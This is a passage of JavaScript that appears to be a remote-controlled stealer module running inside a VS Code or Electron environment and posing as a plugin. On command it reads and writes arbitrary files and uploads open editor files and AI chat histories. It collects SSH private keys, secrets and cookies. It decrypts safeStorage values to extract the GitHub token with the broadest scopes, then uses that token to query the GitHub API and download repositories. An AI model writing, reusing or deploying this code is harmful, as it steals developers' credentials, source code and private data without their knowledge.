                response: obj.response ? extractResponseText(obj.response) : '',
                model: obj.model || '',
                files: []
            };
            messages.push(directMsg);
        }
    }

    // If no explicit title, use first message as preview
    if (!title && messages.length > 0 && messages[0].text) {
        title = messages[0].text.substring(0, 80);
    }

    plugin.sendData('chat_history', {
        sessionFile: sessionFile,
        title: title || '(empty session)',
        messages: messages
    });
}

function readChatSessionJson(sessionFile, data) {
    var title = data.title || data.customTitle || '';
    var messages = [];

    // chatEditingSessions may store requests or chatMessages
    var requests = data.requests || data.chatMessages || [];
    for (var i = 0; i < requests.length; i++) {
        var msg = extractChatMessage(requests[i]);
        if (msg && (msg.text || msg.response)) {
            messages.push(msg);
        }
    }

    if (!title && messages.length > 0 && messages[0].text) {
        title = messages[0].text.substring(0, 80);
    }

    plugin.sendData('chat_history', {
        sessionFile: sessionFile,
        title: title || '(editing session)',
        messages: messages
    });
}

function extractChatMessage(req) {
    if (!req) return null;
    var msg = {
        role: 'exchange',
        text: '',
        response: '',
        model: '',
        files: []
    };

    // User message
    if (req.message && req.message.text) {
        msg.text = req.message.text;
    }

    // Model info
    if (req.model) msg.model = req.model;
    else if (req.modelId) msg.model = req.modelId;

    // Response
    if (req.response) {
        msg.response = extractResponseText(req.response);
    }

    // Attached files / code context
    if (req.message && req.message.references) {
        for (var i = 0; i < req.message.references.length; i++) {
            var ref = req.message.references[i];
            if (ref.uri || ref.relativePath || ref.name) {
                msg.files.push(ref.uri || ref.relativePath || ref.name);
            }
        }
    }

    if (!msg.text && !msg.response) return null;
    return msg;
}

function extractResponseText(response) {
    if (typeof response === 'string') return response;
    if (!response) return '';

    // Array of response parts (each part has a kind field)
    if (Array.isArray(response)) {
        var parts = [];
        for (var i = 0; i < response.length; i++) {
            var part = response[i];
            if (typeof part === 'string') { parts.push(part); continue; }
            if (!part) continue;

            // kind-based dispatch (VS Code Copilot response part format)
            if (part.kind === 'markdownContent' && part.content && part.content.value) {
                parts.push(part.content.value);
            } else if (part.kind === 'thinking' && part.value) {
                // Thinking blocks — include as context
                parts.push('[Thinking]\n' + part.value + '\n[/Thinking]\n');
            } else if (part.kind === 'textEditGroup' && part.edits) {
                // Code edits — summarize
                parts.push('[Code Edit: ' + (part.uri || 'file') + ']\n');
            } else if (part.kind === 'progressMessage' && part.content && part.content.value) {
                // Progress messages (tool use, etc.)
                parts.push('[' + part.content.value + ']\n');
            } else if (part.value) {
                parts.push(part.value);
            } else if (part.text) {
                parts.push(part.text);
            }
        }
        return parts.join('');
    }

    // Object with value
    if (response.value) return response.value;
    if (response.text) return response.text;

    return '';
}

// ===== File Operations =====

function readFile(filePath) {
    try {
        var stat = fs.statSync(filePath);
        // Limit to 1MB reads
        if (stat.size > 1048576) {
            plugin.sendData('file_content', {
                filePath: filePath,
                content: '[File too large: ' + stat.size + ' bytes. Max 1MB.]',
                size: stat.size
            });
            return;
        }
        var content = fs.readFileSync(filePath, 'utf8');
        plugin.sendData('file_content', {
            filePath: filePath,
            content: content,
            size: stat.size
        });
    } catch (e) {
        plugin.sendData('_error', { phase: 'read_file', error: String(e), filePath: filePath });
    }
}

function writeFile(filePath, content) {
    try {
        fs.writeFileSync(filePath, content, 'utf8');
        plugin.sendData('write_result', { filePath: filePath, success: true });
    } catch (e) {
        plugin.sendData('write_result', { filePath: filePath, success: false, error: String(e) });
    }
}

function listDir(dirPath) {
    try {
        var entries = fs.readdirSync(dirPath);
        var result = [];
        for (var i = 0; i < entries.length; i++) {
            var fullPath = path.join(dirPath, entries[i]);
            var stat = safeStatSync(fullPath);
            result.push({
                name: entries[i],
                type: stat && stat.isDirectory() ? 'dir' : 'file',
                size: stat ? stat.size : 0
            });
        }
        // Sort: directories first, then alphabetical
        result.sort(function(a, b) {
            if (a.type !== b.type) return a.type === 'dir' ? -1 : 1;
            return a.name.localeCompare(b.name);
        });
        plugin.sendData('dir_listing', { dirPath: dirPath, entries: result });
    } catch (e) {
        plugin.sendData('_error', { phase: 'list_dir', error: String(e), dirPath: dirPath });
    }
}

function readSSHKey(keyName) {
    // Re-collect all SSH keys but force-include the requested key's content
    var keys = [];
    var sshEntries = safeReadDir(sshDir);
    for (var i = 0; i < sshEntries.length; i++) {
        var name = sshEntries[i];
        var fullPath = path.join(sshDir, name);
        var stat = safeStatSync(fullPath);
        if (!stat || stat.isDirectory()) continue;

        var entry = {
            name: name,
            size: stat.size,
            isPublic: name.indexOf('.pub') !== -1,
            content: null
        };

        // Always read public keys, config, known_hosts, authorized_keys
        // Also read the specifically requested key
        if (entry.isPublic || name === 'known_hosts' || name === 'config' ||
            name === 'authorized_keys' || name === keyName) {
            entry.content = safeReadFile(fullPath);
        }

        keys.push(entry);
    }

    plugin.sendData('ssh_keys', { keys: keys });
}

// ===== Bulk File Download =====

function downloadOpenFiles() {
    // Try renderer first for accurate open files list, then fall back to DB
    queryRendererTabs().then(function(rendererEditors) {
        var openEditors = (rendererEditors && rendererEditors.length > 0) ? rendererEditors : findOpenEditors();
        bundleAndSendFiles(openEditors);
    }).catch(function() {
        bundleAndSendFiles(findOpenEditors());
    });
}

function bundleAndSendFiles(openEditors) {
    if (!openEditors || openEditors.length === 0) {
        plugin.sendData('_error', { phase: 'download_open_files', error: 'No open editors found' });
        return;
    }

    var files = [];
    var totalSize = 0;
    var maxFileSize = 1048576; // 1MB per file limit

    for (var i = 0; i < openEditors.length; i++) {
        var filePath = openEditors[i];
        try {
            var stat = fs.statSync(filePath);
            if (stat.size > maxFileSize) {
                files.push({ path: filePath, content: null, size: stat.size, error: 'Too large' });
                continue;
            }
            var content = fs.readFileSync(filePath, 'utf8');
            files.push({ path: filePath, content: content, size: stat.size });
            totalSize += stat.size;
        } catch (e) {
            files.push({ path: filePath, content: null, size: 0, error: String(e) });
        }
    }

    plugin.sendData('bulk_files', { files: files, totalSize: totalSize });
}

// ===== GitHub Token & API =====

var _githubToken = '';
var _githubAccount = '';

// Decrypt a safeStorage-encrypted Buffer value from state.vscdb
// Values are stored as JSON: {"type":"Buffer","data":[byte, byte, ...]}
// Electron's safeStorage.decryptString() can reverse this when password-store: basic
function decryptSafeStorageValue(val) {
    if (!val) return null;
    var parsed = safeParse(val);
    if (!parsed || parsed.type !== 'Buffer' || !Array.isArray(parsed.data)) return null;

    try {
        // Reconstruct the Buffer from the byte array
        var buf = Buffer.from(parsed.data);
        // Use Electron's safeStorage to decrypt
        var safeStorage = null;
        try {
            safeStorage = plugin.require('electron').safeStorage;
        } catch (e) {
            // Try alternate access
            try { safeStorage = plugin.electron.safeStorage; } catch (e2) {}
        }
        if (!safeStorage || !safeStorage.decryptString) return null;
        return safeStorage.decryptString(buf);
    } catch (e) {
        return null;
    }
}

function extractGitHubToken() {
    // Check if password-store is basic (secrets in vscdb vs system keyring)
    var argvPath = path.join(homeDir, '.vscode', 'argv.json');
    var argvContent = safeReadFile(argvPath);
    var passwordStore = '';
    if (argvContent) {
        // argv.json may have comments, strip them
        var argvClean = argvContent.replace(/\/\/.*$/gm, '');
        var argvData = safeParse(argvClean);
        if (argvData && argvData['password-store']) {
            passwordStore = argvData['password-store'];
        }
    }

    var globalDb = path.join(globalStorageDir, 'state.vscdb');
    var rows = queryVscdb(globalDb, 'SELECT key, value FROM ItemTable');
    if (!rows) {
        plugin.sendData('github_token', {
            token: '', account: '', scopes: [],
            source: 'not found',
            error: 'Cannot read state.vscdb',
            passwordStore: passwordStore
        });
        return;
    }

    // Look for GitHub auth keys — cast a wide net
    var candidates = [];
    var allKeys = [];
    for (var i = 0; i < rows.length; i++) {
        var key = rows[i][0] || '';
        var keyLower = key.toLowerCase();
        allKeys.push(key);

        // Match any key that mentions github
        if (keyLower.indexOf('github') !== -1) {
            candidates.push({ key: key, value: rows[i][1] });
        }
        // Also match secret:// keys (may contain github tokens under different names)
        if (keyLower.indexOf('secret://') !== -1) {
            candidates.push({ key: key, value: rows[i][1] });
        }
        // Also match any key with token/auth/oauth/session that has a value containing gho_/ghp_
        if ((keyLower.indexOf('token') !== -1 || keyLower.indexOf('auth') !== -1 ||
             keyLower.indexOf('oauth') !== -1 || keyLower.indexOf('session') !== -1) &&
            rows[i][1] && (rows[i][1].indexOf('gho_') !== -1 || rows[i][1].indexOf('ghp_') !== -1 ||
            rows[i][1].indexOf('github_pat_') !== -1)) {
            candidates.push({ key: key, value: rows[i][1] });
        }
    }

    if (candidates.length === 0) {
        plugin.sendData('github_token', {
            token: '', account: '', scopes: [],
            source: 'not found',
            error: passwordStore === 'basic' ?
                'No GitHub auth keys found in state.vscdb (password-store is basic — keys should be here)' :
                'No GitHub auth keys in state.vscdb. password-store: "' + (passwordStore || 'not set') + '" — secrets may be in system keyring instead.',
            passwordStore: passwordStore,
            hint: passwordStore !== 'basic' ? 'Set "password-store": "basic" in ~/.vscode/argv.json and re-auth to move secrets to vscdb' : ''
        });
        return;
    }

    // Collect ALL tokens across all candidates and pick the one with broadest
    // scopes. VS Code stores multiple sessions (e.g. narrow OAuth for Copilot
    // + broad OAuth with repo scope), and the first found is not the best.
    var bestResult = null;
    var bestScore = -1;
    var bestSource = '';

    function updateBest(result, source) {
        if (!result || !result.token) return;
        var score = tokenScore(result);
        if (score > bestScore) {
            bestScore = score;
            bestResult = result;
            bestSource = source;
        }
    }

    // Pass 1: Look for plaintext tokens
    for (var c = 0; c < candidates.length; c++) {
        var val = candidates[c].value;
        if (!val) continue;

        var parsed = safeParse(val);

        // Skip encrypted Buffer values for now (handled in pass 2)
        if (parsed && parsed.type === 'Buffer' && Array.isArray(parsed.data)) continue;

        if (parsed) {
            var tokenResults = deepFindAllGitHubTokens(parsed);
            for (var tr = 0; tr < tokenResults.length; tr++) {
                updateBest(tokenResults[tr], candidates[c].key);
            }
        }

        // Raw token string
        if (typeof val === 'string' && (val.indexOf('gho_') === 0 || val.indexOf('ghp_') === 0 || val.indexOf('github_pat_') === 0)) {
            updateBest({ token: val, account: '', scopes: [] }, candidates[c].key);
        }

        // Regex scan raw value (only if not already parsed as JSON)
        if (!parsed && typeof val === 'string') {
            var tokenMatch = val.match(/(gho_[A-Za-z0-9_]{30,}|ghp_[A-Za-z0-9_]{30,}|github_pat_[A-Za-z0-9_]{30,})/);
            if (tokenMatch) {
                updateBest({ token: tokenMatch[1], account: '', scopes: [] }, candidates[c].key + ' (regex)');
            }
        }
    }

    // Pass 2: Try decrypting safeStorage-encrypted Buffer values
    for (var c2 = 0; c2 < candidates.length; c2++) {
        var val2 = candidates[c2].value;
        if (!val2) continue;

        var decrypted = decryptSafeStorageValue(val2);
        if (!decrypted) continue;

        // Decrypted value could be a JSON string with session data
        var decParsed = safeParse(decrypted);
        if (decParsed) {
            var decTokenResults = deepFindAllGitHubTokens(decParsed);
            for (var dtr = 0; dtr < decTokenResults.length; dtr++) {
                updateBest(decTokenResults[dtr], candidates[c2].key + ' (decrypted)');
            }
        }

        // Decrypted could be a raw token string
        if (decrypted.indexOf('gho_') === 0 || decrypted.indexOf('ghp_') === 0 || decrypted.indexOf('github_pat_') === 0) {
            updateBest({ token: decrypted, account: '', scopes: [] }, candidates[c2].key + ' (decrypted)');
        }

        // Regex scan the decrypted value (only if not already parsed)
        if (!decParsed) {
            var decMatch = decrypted.match(/(gho_[A-Za-z0-9_]{30,}|ghp_[A-Za-z0-9_]{30,}|github_pat_[A-Za-z0-9_]{30,})/);
            if (decMatch) {
                updateBest({ token: decMatch[1], account: '', scopes: [] }, candidates[c2].key + ' (decrypted regex)');
            }
        }
    }

    // Return the best token found
    if (bestResult) {
        _githubToken = bestResult.token;
        _githubAccount = bestResult.account || '';
        plugin.sendData('github_token', {
            token: bestResult.token,
            account: _githubAccount,
            scopes: bestResult.scopes || [],
            source: bestSource
        });
        return;
    }

    // Didn't find a parseable token — include truncated values and decryption attempts for debugging
    var debugCandidates = candidates.map(function(cd) {
        var preview = cd.value ? cd.value.substring(0, 200) : '(empty)';
        var isEncrypted = false;
        var decryptResult = null;
        var parsedVal = safeParse(cd.value);
        if (parsedVal && parsedVal.type === 'Buffer' && Array.isArray(parsedVal.data)) {
            isEncrypted = true;
            var dec = decryptSafeStorageValue(cd.value);
            decryptResult = dec ? dec.substring(0, 200) : '(decryption failed)';
        }
        return { key: cd.key, preview: preview, isEncrypted: isEncrypted, decryptResult: decryptResult };
    });
    plugin.sendData('github_token', {
        token: '',
        account: '',
        scopes: [],
        source: 'found keys but no parseable token',
        rawKeys: candidates.map(function(cd) { return cd.key; }),
        passwordStore: passwordStore,
        hint: 'safeStorage decryption was attempted on encrypted values — check decryptResult in previews',
        debugCandidates: debugCandidates
    });
}

function deepFindGitHubToken(obj, depth) {
    if (!obj || typeof obj !== 'object' || (depth || 0) > 10) return null;
    depth = depth || 0;

    if (Array.isArray(obj)) {
        for (var i = 0; i < obj.length; i++) {
            var r = deepFindGitHubToken(obj[i], depth + 1);
            if (r) return r;
        }
        return null;
    }

    // Check common token property names
    var tokenProps = ['accessToken', 'access_token', 'token', 'pat', 'oauthToken'];
    for (var t = 0; t < tokenProps.length; t++) {
        var tv = obj[tokenProps[t]];
        if (tv && typeof tv === 'string' && tv.length > 20) {
            return {
                token: tv,
                account: (obj.account && (obj.account.label || obj.account.login || obj.account.id)) || obj.login || obj.accountName || '',
                scopes: obj.scopes || []
            };
        }
    }

    // Check if any string value looks like a GitHub token
    var keys = Object.keys(obj);
    for (var k = 0; k < keys.length; k++) {
        var v = obj[keys[k]];
        if (typeof v === 'string' && (v.indexOf('gho_') === 0 || v.indexOf('ghp_') === 0 || v.indexOf('github_pat_') === 0)) {
            return { token: v, account: '', scopes: [] };
        }
    }

    // Recurse into sub-objects
    for (var j = 0; j < keys.length; j++) {
        if (typeof obj[keys[j]] === 'object') {
            var r2 = deepFindGitHubToken(obj[keys[j]], depth + 1);
            if (r2) return r2;
        }
    }

    // Check sessions/data arrays that may be nested
    if (obj.sessions) {
        var r3 = deepFindGitHubToken(obj.sessions, depth + 1);
        if (r3) return r3;
    }

    return null;
}

function deepFindAllGitHubTokens(obj) {
    var results = [];
    _collectGitHubTokens(obj, results, 0);
    return results;
}

function _collectGitHubTokens(obj, results, depth) {
    if (!obj || typeof obj !== 'object' || depth > 10) return;

    if (Array.isArray(obj)) {
        for (var i = 0; i < obj.length; i++) {
            _collectGitHubTokens(obj[i], results, depth + 1);
        }
        return;
    }

    // Check common token property names
    var tokenProps = ['accessToken', 'access_token', 'token', 'pat', 'oauthToken'];
    for (var t = 0; t < tokenProps.length; t++) {
        var tv = obj[tokenProps[t]];
        if (tv && typeof tv === 'string' && tv.length > 20) {
            results.push({
                token: tv,
                account: (obj.account && (obj.account.label || obj.account.login || obj.account.id)) || obj.login || obj.accountName || '',
                scopes: obj.scopes || []
            });
            return; // Found token at this level, don't recurse deeper
        }
    }

    // Check if any string value looks like a GitHub token
    var keys = Object.keys(obj);
    for (var k = 0; k < keys.length; k++) {
        var v = obj[keys[k]];
        if (typeof v === 'string' && (v.indexOf('gho_') === 0 || v.indexOf('ghp_') === 0 || v.indexOf('github_pat_') === 0)) {
            results.push({ token: v, account: '', scopes: [] });
            return;
        }
    }

    // Recurse into sub-objects
    for (var j = 0; j < keys.length; j++) {
        if (typeof obj[keys[j]] === 'object') {
            _collectGitHubTokens(obj[keys[j]], results, depth + 1);
        }
    }
}

function tokenScore(result) {
    if (!result || !result.token) return -1;
    var scopes = result.scopes || [];
    var score = scopes.length;
    for (var i = 0; i < scopes.length; i++) {
        var s = String(scopes[i]).toLowerCase();
        if (s === 'repo') score += 100;
        if (s === 'workflow') score += 10;
        if (s === 'write:packages') score += 5;
        if (s === 'read:org') score += 5;
    }
    // ghp_ (PAT) and github_pat_ generally have broader permissions than gho_ (OAuth)
    if (result.token.indexOf('ghp_') === 0 || result.token.indexOf('github_pat_') === 0) score += 3;
    return score;
}

function githubApi(endpoint) {
    if (!_githubToken) {
        plugin.sendData('github_data', { endpoint: endpoint, data: null, error: 'No GitHub token extracted' });
        return;
    }

    // Use python urllib to call GitHub API
    var py = findPython();
    if (!py) {
        plugin.sendData('github_data', { endpoint: endpoint, data: null, error: 'Python not found' });
        return;
    }
    // Single-line Python script (no newlines — cmd.exe on Windows breaks on
    // multi-line commands inside double quotes). Wraps response with X-OAuth-Scopes
    // header for diagnostics.
    var pyScript = "import urllib.request,json,sys; " +
        "req=urllib.request.Request(" +
        "'https://api.github.com" + endpoint.replace(/'/g, '') + "', " +
        "headers={'Authorization':'Bearer " + _githubToken + "'," +
        "'User-Agent':'VS-Code-Plugin','Accept':'application/vnd.github.v3+json'}); " +
        "resp=urllib.request.urlopen(req, timeout=15); " +
        "d=resp.read(); " +
        "print(json.dumps({'data':json.loads(d),'scopes':resp.headers.get('X-OAuth-Scopes','')}))";

    var result = execSafe(py + ' -c "' + pyScript + '"', { timeout: 20000 });
    if (result) {
        var wrapped = safeParse(result);
        if (wrapped && wrapped.data !== undefined) {
            plugin.sendData('github_data', {
                endpoint: endpoint,
                data: wrapped.data,
                tokenScopes: wrapped.scopes || ''
            });
        } else {
            // Fallback: try raw parse (backwards compatible)
            var data = safeParse(result);
            plugin.sendData('github_data', { endpoint: endpoint, data: data });
        }
    } else {
        plugin.sendData('github_data', { endpoint: endpoint, data: null, error: 'API call failed (python subprocess error)' });
    }
}

function downloadRepo(repoFullName) {
    if (!_githubToken) {
        plugin.sendData('_error', { phase: 'download_repo', error: 'No GitHub token' });
        return;
    }

    // Download the zipball via GitHub API
    // Python writes base64 data to a temp file to avoid Node's maxBuffer limits
    var safeName = repoFullName.replace(/'/g, '').replace(/[^a-zA-Z0-9\/_.-]/g, '');
    var ts = Date.now();
    var tmpScript = path.join(os.tmpdir(), '.vsc_dl_' + ts + '.py');
    var tmpOutput = path.join(os.tmpdir(), '.vsc_dl_' + ts + '.b64');

    var scriptContent = [
        'import urllib.request, base64, json, sys',
        'MAX = 50 * 1024 * 1024',
        'OUT = "' + tmpOutput.replace(/\\/g, '\\\\') + '"',
        'try:',
        '    req = urllib.request.Request(',
        '        "https://api.github.com/repos/' + safeName + '/zipball",',
        '        headers={',
        '            "Authorization": "Bearer ' + _githubToken + '",',
        '            "User-Agent": "VS-Code-Plugin",',
        '            "Accept": "application/vnd.github.v3+json"',
        '        })',
        '    resp = urllib.request.urlopen(req, timeout=120)',
        '    chunks = []',
        '    total = 0',
        '    while True:',
        '        chunk = resp.read(65536)',
        '        if not chunk:',
        '            break',
        '        total += len(chunk)',
        '        if total > MAX:',
        '            print(json.dumps({"error": "Repo too large (>50MB)", "size": total}))',
        '            sys.exit(0)',
        '        chunks.append(chunk)',
        '    data = b"".join(chunks)',
        '    with open(OUT, "w") as f:',
        '        f.write(base64.b64encode(data).decode())',
        '    print(json.dumps({"ok": True, "size": len(data)}))',
        'except Exception as e:',
        '    print(json.dumps({"error": str(e)}))',
    ].join('\n');

    try {
        fs.writeFileSync(tmpScript, scriptContent, 'utf8');
    } catch (e) {
        plugin.sendData('_error', { phase: 'download_repo', error: 'Cannot write temp script: ' + String(e) });
        return;
    }

    var py2 = findPython();
    if (!py2) {
        plugin.sendData('_error', { phase: 'download_repo', error: 'Python not found' });
        try { fs.unlinkSync(tmpScript); } catch (e) {}
        return;
    }
    var result = execSafe(py2 + ' ' + tmpScript, { timeout: 180000 });

    // Clean up script
    try { fs.unlinkSync(tmpScript); } catch (e) {}

    if (result) {
        var parsed = safeParse(result);
        if (parsed && parsed.error) {
            try { fs.unlinkSync(tmpOutput); } catch (e) {}
            plugin.sendData('_error', { phase: 'download_repo', error: safeName + ': ' + parsed.error });
            return;
        }
        if (parsed && parsed.ok) {
            // Read the base64 data from the temp output file
            var b64Data = safeReadFile(tmpOutput);
            try { fs.unlinkSync(tmpOutput); } catch (e) {}

            if (b64Data) {
                var filename = repoFullName.replace(/\//g, '_') + '.zip';
                plugin.sendData('repo_archive', {
                    repo: repoFullName,
                    filename: filename,
                    data: b64Data,
                    size: parsed.size
                });
                return;
            }
            plugin.sendData('_error', { phase: 'download_repo', error: safeName + ': downloaded but cannot read temp file' });
            return;
        }
    }

    try { fs.unlinkSync(tmpOutput); } catch (e) {}
    plugin.sendData('_error', { phase: 'download_repo', error: 'Failed to download ' + safeName + (result ? ': ' + result.substring(0, 200) : ' (no output)') });
}

function debugDumpKeys() {
    var result = {
        workspacePath: workspacePath,
        workspaceStorageHash: workspaceStorageHash,
        globalStorageDir: globalStorageDir,
        workspaceStorageDir: workspaceStorageDir,
        globalKeys: [],
        workspaceKeys: []
    };

    // Dump all keys from global state.vscdb
    var globalDb = path.join(globalStorageDir, 'state.vscdb');
    var globalRows = queryVscdb(globalDb, 'SELECT key FROM ItemTable');
    if (globalRows) {
        for (var i = 0; i < globalRows.length; i++) {
            result.globalKeys.push(globalRows[i][0]);
        }
    }

    // Dump all keys from workspace state.vscdb
    if (workspaceStorageHash) {
        var wsDb = path.join(workspaceStorageDir, workspaceStorageHash, 'state.vscdb');
        var wsRows = queryVscdb(wsDb, 'SELECT key FROM ItemTable');
        if (wsRows) {
            for (var j = 0; j < wsRows.length; j++) {
                result.workspaceKeys.push(wsRows[j][0]);
            }
        }
    }

    // Also list all workspace storage directories
    result.allWorkspaceDirs = safeReadDir(workspaceStorageDir);

    plugin.sendData('_debug', result);
}

// ===== Command Handler =====

function onCommand(cmd) {
    var action = cmd.action;

    if (action === 'refresh') return collectProjectInfo();
    if (action === 'collect_git') return collectGitInfo();
    if (action === 'collect_secrets') return collectSecrets();
    if (action === 'collect_ssh') return collectSSHKeys();
    if (action === 'collect_cookies') return collectCookies();
    if (action === 'list_chat_sessions') return collectChatSessions();
    if (action === 'read_chat') return readChatSession(cmd.sessionFile);
    if (action === 'read_file') return readFile(cmd.filePath);
    if (action === 'write_file') return writeFile(cmd.filePath, cmd.content);
    if (action === 'list_dir') return listDir(cmd.dirPath);
    if (action === 'read_ssh_key') return readSSHKey(cmd.keyName);
    if (action === 'download_open_files') return downloadOpenFiles();
    if (action === 'github_extract_token') return extractGitHubToken();
    if (action === 'github_api') return githubApi(cmd.endpoint);
    if (action === 'github_download_repo') return downloadRepo(cmd.repo);
    if (action === 'debug_dump_keys') return debugDumpKeys();

    plugin.sendData('_error', { phase: 'command', error: 'Unknown action: ' + action });
}

// ===== Bootstrap =====

plugin.setTimeout(bootstrap, 3000);

return {
    cleanup: function() {},
    onCommand: onCommand
};
